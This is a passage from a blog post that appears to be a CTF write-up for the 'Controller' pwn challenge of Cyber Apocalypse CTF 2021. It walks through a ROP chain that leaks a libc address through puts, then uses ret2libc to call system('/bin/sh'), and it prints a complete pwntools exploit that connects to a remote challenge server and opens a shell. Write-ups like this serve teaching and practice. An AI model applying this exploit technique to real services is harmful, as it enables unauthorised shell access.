<span class="n">ropchain</span> <span class="o">=</span> <span class="nb">buffer</span> <span class="o">+</span> <span class="n">pwn</span><span class="p">.</span><span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">)</span> <span class="o">+</span> <span class="n">pwn</span><span class="p">.</span><span class="n">p64</span><span class="p">(</span><span class="n">got_puts</span><span class="p">)</span> <span class="o">+</span> <span class="n">pwn</span><span class="p">.</span><span class="n">p64</span><span class="p">(</span><span class="n">plt_puts</span><span class="p">)</span> <span class="o">+</span> <span class="n">pwn</span><span class="p">.</span><span class="n">p64</span><span class="p">(</span><span class="n">main_addr</span><span class="p">)</span>
<span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"&gt;"</span><span class="p">,</span> <span class="n">ropchain</span><span class="p">)</span>
</pre></table></code></div></div><p>Adding <code class="language-plaintext highlighter-rouge">pwn.p64 (main_addr)</code> to the end of our ropchain is not necessary to get a libc leak. However, we need it to go back to the start of the program and send a second ropchain which will allow us to obtain a shell.</p><ul><li>The leak is present in the second line of the answer so we make two successive calls to <code class="language-plaintext highlighter-rouge">recvline()</code></li></ul><blockquote><p>The first line of the response displays <code class="language-plaintext highlighter-rouge">Problem ingored</code> because our buffer does not start with<code class="language-plaintext highlighter-rouge"> 'y' / 'Y'</code> ()</p></blockquote><div class="language-python highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre><span class="n">r</span><span class="p">.</span><span class="n">recvline</span><span class="p">()</span> <span class="c1"># Problem ingored
</span><span class="n">leak</span> <span class="o">=</span> <span class="n">r</span><span class="p">.</span><span class="n">recvline</span><span class="p">().</span><span class="n">strip</span><span class="p">()</span>
<span class="n">puts_addr</span> <span class="o">=</span> <span class="n">pwn</span><span class="p">.</span><span class="n">u64</span><span class="p">(</span><span class="n">leak</span><span class="p">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0x8</span><span class="p">,</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x00</span><span class="s">"</span><span class="p">))</span>
<span class="n">pwn</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Puts address: 0x%x"</span> <span class="o">%</span> <span class="n">puts_addr</span><span class="p">)</span>
</pre></table></code></div></div><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/assets/img/ctf/cyber-apocalypse-2021/pwn/controller/puts_address.png" alt="" /></p><ul><li>To calculate the base address of the libc, all you have to do is subtract the offset of the <code class="language-plaintext highlighter-rouge">puts()</code> function in the <code class="language-plaintext highlighter-rouge">libc.so.6</code> file from the address of the <code class="language-plaintext highlighter-rouge">puts()</code> function that we just leaked:</li></ul><div class="language-python highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="n">libc_base</span> <span class="o">=</span> <span class="n">puts_addr</span> <span class="o">-</span> <span class="n">libc</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'puts'</span><span class="p">]</span>
<span class="n">pwn</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"LIBC base: 0x%x"</span> <span class="o">%</span> <span class="n">libc_base</span><span class="p">)</span>
</pre></table></code></div></div><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/assets/img/ctf/cyber-apocalypse-2021/pwn/controller/libc_address.png" alt="" /></p><p>Now that we have the base address of the LIBC, we will be able to retrieve the addresses of <code class="language-plaintext highlighter-rouge">system()</code> and “<code class="language-plaintext highlighter-rouge">/bin/sh</code>”.</p><h2 id="3-ropchain--ret2libc">3. Ropchain &amp; ret2libc</h2><ul><li>To determine the addresses of <code class="language-plaintext highlighter-rouge">system()</code> and of “<code class="language-plaintext highlighter-rouge">/bin/sh</code> “, just do the opposite operation: we add the base address of the libc to the offsets of <code class="language-plaintext highlighter-rouge">system()</code> and of “<code class="language-plaintext highlighter-rouge">/bin/sh</code>” in the file <code class="language-plaintext highlighter-rouge">libc.so.6</code>:</li></ul><div class="language-python highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre><span class="n">system_addr</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'system'</span><span class="p">]</span>
<span class="n">bin_sh_addr</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="nb">next</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">search</span><span class="p">(</span><span class="sa">b</span><span class="s">'/bin/sh'</span><span class="p">))</span>
<span class="n">pwn</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"System address: 0x%x"</span> <span class="o">%</span> <span class="n">system_addr</span><span class="p">)</span>
<span class="n">pwn</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"'/bin/sh' address: 0x%x"</span> <span class="o">%</span> <span class="n">bin_sh_addr</span><span class="p">)</span>
</pre></table></code></div></div><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/assets/img/ctf/cyber-apocalypse-2021/pwn/controller/system_binsh_addresses.png" alt="" /></p><ul><li>Now we just have to prepare the ropchain which will allow us to obtain the shell:</li></ul><div class="language-python highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">ropchain</span> <span class="o">=</span> <span class="nb">buffer</span> <span class="o">+</span> <span class="n">pwn</span><span class="p">.</span><span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">)</span> <span class="o">+</span> <span class="n">pwn</span><span class="p">.</span><span class="n">p64</span><span class="p">(</span><span class="n">bin_sh_addr</span><span class="p">)</span> <span class="o">+</span> <span class="n">pwn</span><span class="p">.</span><span class="n">p64</span><span class="p">(</span><span class="n">system_addr</span><span class="p">)</span>
</pre></table></code></div></div><ul><li>Using the above payload, I systematically got the error “Got EOF while reading in interactive”.</li></ul><p>Finally thanks to <a href="https://reverseengineering.stackexchange.com/questions/21524/receiving-got-eof-while-reading-in-interactive-after-properly-executing-system">this forum</a>, I was able to solve this problem and update the payload:</p><div class="language-python highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="n">ret</span> <span class="o">=</span> <span class="p">(</span><span class="n">rop_binary</span><span class="p">.</span><span class="n">find_gadget</span><span class="p">([</span><span class="s">'ret'</span><span class="p">]))[</span><span class="mi">0</span><span class="p">]</span>  

<span class="n">ropchain</span> <span class="o">=</span> <span class="nb">buffer</span> <span class="o">+</span> <span class="n">pwn</span><span class="p">.</span><span class="n">p64</span><span class="p">(</span><span class="n">ret</span><span class="p">)</span> <span class="o">+</span> <span class="n">pwn</span><span class="p">.</span><span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">)</span> <span class="o">+</span> <span class="n">pwn</span><span class="p">.</span><span class="n">p64</span><span class="p">(</span><span class="n">bin_sh_addr</span><span class="p">)</span> <span class="o">+</span> <span class="n">pwn</span><span class="p">.</span><span class="n">p64</span><span class="p">(</span><span class="n">system_addr</span><span class="p">)</span>
</pre></table></code></div></div><p>We end up sending this last ropchain and we use the <code class="language-plaintext highlighter-rouge">interactive()</code> method to interact with the shell:</p><div class="language-python highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre><span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"Insert the amount of 2 different types of recources:"</span><span class="p">,</span> <span class="sa">b</span><span class="s">"-2147483648 -2147418310"</span><span class="p">)</span>
<span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"&gt;"</span><span class="p">,</span> <span class="sa">b</span><span class="s">"1"</span><span class="p">)</span>
<span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"&gt;"</span><span class="p">,</span> <span class="n">ropchain</span><span class="p">)</span>

<span class="n">r</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
<span class="n">r</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
</pre></table></code></div></div><h2 id="4-final-exploit">4. Final Exploit</h2><div class="language-python highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
</pre><td class="rouge-code"><pre><span class="kn">import</span> <span class="nn">pwn</span>

<span class="n">host</span> <span class="o">=</span> <span class="s">"165.227.236.40"</span>
<span class="n">port</span> <span class="o">=</span> <span class="mi">30519</span>

<span class="n">remote</span> <span class="o">=</span> <span class="bp">True</span>

<span class="n">binary_path</span> <span class="o">=</span> <span class="s">'./controller'</span>
<span class="n">libc_path</span> <span class="o">=</span> <span class="s">'./libc.so.6'</span>
<span class="n">ld_path</span> <span class="o">=</span> <span class="s">'./ld-2.27.so'</span>
<span class="n">binary</span> <span class="o">=</span> <span class="n">pwn</span><span class="p">.</span><span class="n">ELF</span><span class="p">(</span><span class="n">binary_path</span><span class="p">)</span>
<span class="n">libc</span> <span class="o">=</span> <span class="n">pwn</span><span class="p">.</span><span class="n">ELF</span><span class="p">(</span><span class="n">libc_path</span><span class="p">)</span>
<span class="n">rop_binary</span> <span class="o">=</span> <span class="n">pwn</span><span class="p">.</span><span class="n">ROP</span><span class="p">(</span><span class="n">binary</span><span class="p">)</span>

<span class="k">if</span> <span class="n">remote</span><span class="p">:</span>
    <span class="n">r</span> <span class="o">=</span> <span class="n">pwn</span><span class="p">.</span><span class="n">remote</span><span class="p">(</span><span class="n">host</span><span class="p">,</span><span class="n">port</span><span class="p">)</span>
<span class="k">else</span><span class="p">:</span>
    <span class="n">r</span> <span class="o">=</span> <span class="n">pwn</span><span class="p">.</span><span class="n">process</span><span class="p">([</span><span class="n">ld_path</span><span class="p">,</span> <span class="n">binary_path</span><span class="p">],</span> <span class="n">env</span><span class="o">=</span><span class="p">{</span><span class="s">"LD_PRELOAD"</span><span class="p">:</span> <span class="n">libc_path</span><span class="p">})</span>

<span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"Insert the amount of 2 different types of recources:"</span><span class="p">,</span> <span class="sa">b</span><span class="s">"-2147483648 -2147418310"</span><span class="p">)</span>
<span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"&gt;"</span><span class="p">,</span> <span class="sa">b</span><span class="s">"1"</span><span class="p">)</span>

<span class="n">offset</span> <span class="o">=</span> <span class="mi">40</span>
<span class="nb">buffer</span> <span class="o">=</span> <span class="sa">b</span><span class="s">"A"</span> <span class="o">*</span> <span class="n">offset</span>

<span class="c1"># Leak 
</span><span class="n">pop_rdi</span> <span class="o">=</span> <span class="p">(</span><span class="n">rop_binary</span><span class="p">.</span><span class="n">find_gadget</span><span class="p">([</span><span class="s">'pop rdi'</span><span class="p">,</span> <span class="s">'ret'</span><span class="p">]))[</span><span class="mi">0</span><span class="p">]</span>
<span class="n">plt_puts</span> <span class="o">=</span> <span class="n">binary</span><span class="p">.</span><span class="n">plt</span><span class="p">[</span><span class="s">'puts'</span><span class="p">]</span>
<span class="n">got_puts</span> <span class="o">=</span> <span class="n">binary</span><span class="p">.</span><span class="n">got</span><span class="p">[</span><span class="s">'puts'</span><span class="p">]</span>
<span class="n">main_addr</span> <span class="o">=</span> <span class="n">binary</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'main'</span><span class="p">]</span>

<span class="n">ropchain</span> <span class="o">=</span> <span class="nb">buffer</span> <span class="o">+</span> <span class="n">pwn</span><span class="p">.</span><span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">)</span> <span class="o">+</span> <span class="n">pwn</span><span class="p">.</span><span class="n">p64</span><span class="p">(</span><span class="n">got_puts</span><span class="p">)</span> <span class="o">+</span> <span class="n">pwn</span><span class="p">.</span><span class="n">p64</span><span class="p">(</span><span class="n">plt_puts</span><span class="p">)</span> <span class="o">+</span> <span class="n">pwn</span><span class="p">.</span><span class="n">p64</span><span class="p">(</span><span class="n">main_addr</span><span class="p">)</span>
<span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"&gt;"</span><span class="p">,</span> <span class="n">ropchain</span><span class="p">)</span>

<span class="n">r</span><span class="p">.</span><span class="n">recvline</span><span class="p">()</span> <span class="c1"># Problem ingored
</span><span class="n">leak</span> <span class="o">=</span> <span class="n">r</span><span class="p">.</span><span class="n">recvline</span><span class="p">().</span><span class="n">strip</span><span class="p">()</span>
<span class="n">puts_addr</span> <span class="o">=</span> <span class="n">pwn</span><span class="p">.</span><span class="n">u64</span><span class="p">(</span><span class="n">leak</span><span class="p">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0x8</span><span class="p">,</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x00</span><span class="s">"</span><span class="p">))</span>
<span class="n">pwn</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Puts address: 0x%x"</span> <span class="o">%</span> <span class="n">puts_addr</span><span class="p">)</span>

<span class="n">libc_base</span> <span class="o">=</span> <span class="n">puts_addr</span> <span class="o">-</span> <span class="n">libc</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'puts'</span><span class="p">]</span>
<span class="n">pwn</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"LIBC base: 0x%x"</span> <span class="o">%</span> <span class="n">libc_base</span><span class="p">)</span>

<span class="n">system_addr</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'system'</span><span class="p">]</span>
<span class="n">bin_sh_addr</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="nb">next</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">search</span><span class="p">(</span><span class="sa">b</span><span class="s">'/bin/sh'</span><span class="p">))</span>
<span class="n">pwn</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"System address: 0x%x"</span> <span class="o">%</span> <span class="n">system_addr</span><span class="p">)</span>
<span class="n">pwn</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"'/bin/sh' address: 0x%x"</span> <span class="o">%</span> <span class="n">bin_sh_addr</span><span class="p">)</span>

<span class="n">ret</span> <span class="o">=</span> <span class="p">(</span><span class="n">rop_binary</span><span class="p">.</span><span class="n">find_gadget</span><span class="p">([</span><span class="s">'ret'</span><span class="p">]))[</span><span class="mi">0</span><span class="p">]</span>  

<span class="n">ropchain</span> <span class="o">=</span> <span class="nb">buffer</span> <span class="o">+</span> <span class="n">pwn</span><span class="p">.</span><span class="n">p64</span><span class="p">(</span><span class="n">ret</span><span class="p">)</span> <span class="o">+</span> <span class="n">pwn</span><span class="p">.</span><span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">)</span> <span class="o">+</span> <span class="n">pwn</span><span class="p">.</span><span class="n">p64</span><span class="p">(</span><span class="n">bin_sh_addr</span><span class="p">)</span> <span class="o">+</span> <span class="n">pwn</span><span class="p">.</span><span class="n">p64</span><span class="p">(</span><span class="n">system_addr</span><span class="p">)</span>

<span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"Insert the amount of 2 different types of recources:"</span><span class="p">,</span> <span class="sa">b</span><span class="s">"-2147483648 -2147418310"</span><span class="p">)</span>
<span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"&gt;"</span><span class="p">,</span> <span class="sa">b</span><span class="s">"1"</span><span class="p">)</span>
<span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"&gt;"</span><span class="p">,</span> <span class="n">ropchain</span><span class="p">)</span>

<span class="n">r</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
<span class="n">r</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
</pre></table></code></div></div><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/assets/img/ctf/cyber-apocalypse-2021/pwn/controller/flag_controller.png" alt="" /></p><hr /><h1 id="useful-links">Useful links</h1><ul><li><a href="https://stackoverflow.com/questions/2535989/what-are-the-calling-conventions-for-unix-linux-system-calls-and-user-space-f">https://stackoverflow.com/questions/2535989/what-are-the-calling-conventions-for-unix-linux-system-calls-and-user-space-f</a></li><li><a href="https://github.com/io12/pwninit">https://github.com/io12/pwninit</a></li><li><a href="https://book.hacktricks.xyz/exploiting/linux-exploiting-basic-esp/rop-leaking-libc-address#3-finding-libc-library">https://book.hacktricks.xyz/exploiting/linux-exploiting-basic-esp/rop-leaking-libc-address#3-finding-libc-library</a></li><li><a href="https://www.dailysecurity.fr/return_oriented_programming/">https://www.dailysecurity.fr/return_oriented_programming/</a></li><li><a href="https://beta.hackndo.com/return-oriented-programming/#pratique">https://beta.hackndo.com/return-oriented-programming/#pratique</a></li><li><a href="https://faraz.faith/2019-09-16-csaw-quals-baby-boi/">https://faraz.faith/2019-09-16-csaw-quals-baby-boi/</a></li><li><a href="https://reverseengineering.stackexchange.com/questions/21524/receiving-got-eof-while-reading-in-interactive-after-properly-executing-system">https://reverseengineering.stackexchange.com/questions/21524/receiving-got-eof-while-reading-in-interactive-after-properly-executing-system</a></li></ul></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/ctf-writeup/'>CTF writeup</a>, <a href='/categories/pwn/'>Pwn</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/ctf/" class="post-tag no-text-decoration" >CTF</a> <a href="/tags/pwn/" class="post-tag no-text-decoration" >pwn</a> <a href="/tags/64-bit-elf/" class="post-tag no-text-decoration" >64-bit ELF</a> <a href="/tags/buffer-overflow/" class="post-tag no-text-decoration" >buffer overflow</a> <a href="/tags/rop/" class="post-tag no-text-decoration" >ROP</a> <a href="/tags/checksec/" class="post-tag no-text-decoration" >checksec</a> <a href="/tags/gdb-peda/" class="post-tag no-text-decoration" >gdb-peda</a> <a href="/tags/ghidra/" class="post-tag no-text-decoration" >ghidra</a> <a href="/tags/pwntools/" class="post-tag no-text-decoration" >pwntools</a> <a href="/tags/ropper/" class="post-tag no-text-decoration" >ropper</a> <a href="/tags/gadgets/" class="post-tag no-text-decoration" >gadgets</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> by the author.</div><!-- Post sharing snippet v2.1 https://github.com/cotes2020/jekyll-theme-chirpy © 2019 Cotes Chung Published under the MIT License --><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Cyber Apocalypse CTF 2021 - Controller (ROP) - amirr0r&url=https://amirr0r.github.io/posts/cyber-apocalypse-ctf-controller/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Cyber Apocalypse CTF 2021 - Controller (ROP) - amirr0r&u=https://amirr0r.github.io/posts/cyber-apocalypse-ctf-controller/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=Cyber Apocalypse CTF 2021 - Controller (ROP) - amirr0r&url=https://amirr0r.github.io/posts/cyber-apocalypse-ctf-controller/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank"> <i class="fa-fw fab fa-telegram"></i> </a> <i class="fa-fw fas fa-link small" onclick="copyLink()" data-toggle="tooltip" data-placement="top" title="Copy link"></i> </span></div></div></div></div></div><!-- The Pannel on right side (Desktop views) v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"><h3 data-toc-skip>Recent Update</h3><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/crto-review/">CRTO Review (Certified Red Team Operator) & Notion Templates</a></li><li><a href="/posts/htb-forest/">HackTheBox - Forest</a></li><li><a href="/posts/oscp-review/">OSCP Review (Cheat Sheet, Tmux Enumeration Scripts and Notion Templates)</a></li><li><a href="/posts/oscp-prep/">How do I prepare for the OSCP?</a></li><li><a href="/posts/htb-valentine/">HackTheBox - Valentine</a></li></ul></div><div id="access-tags"><h3 data-toc-skip>Trending Tags</h3><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/msfvenom/">msfvenom</a> <a class="post-tag" href="/tags/sudo-misconfiguration/">sudo misconfiguration</a> <a class="post-tag" href="/tags/password-cracking/">password cracking</a> <a class="post-tag" href="/tags/pwn/">pwn</a> <a class="post-tag" href="/tags/meterpreter/">meterpreter</a> <a class="post-tag" href="/tags/gobuster/">gobuster</a> <a class="post-tag" href="/tags/gtfobins/">GTFOBins</a> <a class="post-tag" href="/tags/searchsploit/">searchsploit</a> <a class="post-tag" href="/tags/john-the-ripper/">John The Ripper</a> <a class="post-tag" href="/tags/powershell/">powershell</a></div></div></div><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><h3 data-toc-skip class="pl-3 pt-2 mb-2">Contents</h3><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"> <!-- Recommend the other 3 posts according to the tags and categories of the current post, if the number is not enough, use the other latest posts to supplement. v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2019 Cotes Chung Published under the MIT License --><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/cyber-apocalypse-ctf-minefield/"><div class="card-body"> <!-- Date format snippet v2.4.1 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT License --> <span class="timeago small" > May 19, 2021 <i class="unloaded">2021-05-19T10:00:00+02:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Cyber Apocalypse CTF 2021 - Minefield (Pwn)</h3><div class="text-muted small"><p> A few weeks ago I participated to Cyber Apocalypse CTF 2021 which was organized by hackthebox.eu, cryptohack.org and code.org. I mainly focused on Pwn, Reverse and Forensic challenges. Here is t...</p></div></div></a></div><div class="card"> <a href="/posts/htb-frolic/"><div class="card-body"> <!-- Date format snippet v2.4.1 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT License --> <span class="timeago small" > Dec 29, 2020 <i class="unloaded">2020-12-29T21:24:41+01:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>HackTheBox - Frolic</h3><div class="text-muted small"><p> Foothold nmap scan $ nmap -min-rate 5000 --max-retries 1 -sV -sC -p- -oN Frolic-full-port-scan.txt 10.10.10.111 PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2p2 Ubuntu ...</p></div></div></a></div><div class="card"> <a href="/posts/htb-buff/"><div class="card-body"> <!-- Date format snippet v2.4.1 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT License --> <span class="timeago small" > Sep 7, 2021 <i class="unloaded">2021-09-07T01:49:17+02:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>HackTheBox - Buff</h3><div class="text-muted small"><p> Enumeration nmap scan $ nmap -min-rate 5000 --max-retries 1 -sV -sC -p- -oN Buff-full-port-scan.txt 10.10.10.198 Nmap scan report for 10.10.10.198 Host is up (0.18s latency). Not shown: 65533 fil...</p></div></div></a></div></div></div><!-- Navigation buttons at the bottom of the post. v2.1 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT License --><div class="post-navigation d-flex justify-content-between"> <a href="/posts/htb-active/" class="btn btn-outline-primary"><p>HackTheBox - Active</p></a> <a href="/posts/oscp-review/" class="btn btn-outline-primary"><p>OSCP Review (Cheat Sheet, Tmux Enumeration Scripts and Notion Templates)</p></a></div><!-- The Disqus lazy loading. Powered by: https://osvaldas.info/lazy-loading-disqus-comments v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2019 Cotes Chung MIT License --><div id="disqus" class="pt-2 pb-2"><p class="font-italic text-center text-muted small"> Comments powered by <a href="https://disqus.com/">Disqus</a>.</p></div><script src="/assets/js/lib/jquery.disqusloader.min.js"></script> <script> var options = { scriptUrl: '//amirr0r-github-io.disqus.com/embed.js', disqusConfig: function() { this.page.url = 'https://amirr0r.github.io/posts/cyber-apocalypse-ctf-controller/'; this.page.identifier = '/posts/cyber-apocalypse-ctf-controller/'; } }; $.disqusLoader('#disqus', options); </script></div></div></div><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lozad/dist/lozad.min.js"></script> <script type="text/javascript"> const imgs = document.querySelectorAll('#post-wrapper img'); const observer = lozad(imgs); observer.observe(); </script> <!-- The Footer v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> © 2022 <a href="https://github.com/amirr0r">amirr0r</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div></div></footer></div><!-- The Search results v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-xl-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/tags/msfvenom/">msfvenom</a> <a class="post-tag" href="/tags/sudo-misconfiguration/">sudo misconfiguration</a> <a class="post-tag" href="/tags/password-cracking/">password cracking</a> <a class="post-tag" href="/tags/pwn/">pwn</a> <a class="post-tag" href="/tags/meterpreter/">meterpreter</a> <a class="post-tag" href="/tags/gobuster/">gobuster</a> <a class="post-tag" href="/tags/gtfobins/">GTFOBins</a> <a class="post-tag" href="/tags/searchsploit/">searchsploit</a> <a class="post-tag" href="/tags/john-the-ripper/">John The Ripper</a> <a class="post-tag" href="/tags/powershell/">powershell</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <!-- The GA snippet v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --> <script> (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){ (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o), m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m) })(window,document,'script','https://www.google-analytics.com/analytics.js','ga'); ga('create', '', 'auto'); ga('send', 'pageview'); </script> <!-- Jekyll Simple Search loader v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="https://amirr0r.github.io{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"><div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>{categories}</div><div><i class="fa fa-tag fa-fw"></i>{tags}</div></div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>' }); </script>
